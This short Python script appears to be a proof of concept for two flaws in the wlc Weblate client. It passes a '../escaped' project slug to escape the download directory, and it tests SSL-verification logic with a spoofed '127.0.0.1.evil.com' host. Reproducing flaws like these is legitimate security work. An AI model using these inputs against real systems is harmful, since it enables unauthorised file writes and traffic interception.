import tempfile
from pathlib import Path
from types import SimpleNamespace
from wlc.main import Download
import wlc

root = Path(tempfile.mkdtemp())
out = root / "out"
cmd = Download.__new__(Download)
cmd.args = SimpleNamespace(output=str(out), convert=None, no_glossary=False)
comp = SimpleNamespace(project=SimpleNamespace(slug="../escaped"), slug="x", download=lambda c: b"PK")
cmd.download_component(comp)
print(sorted(str(p.relative_to(root)) for p in root.rglob("*")))
print(wlc.Weblate._should_verify_ssl("https://127.0.0.1.evil.com/api/"))
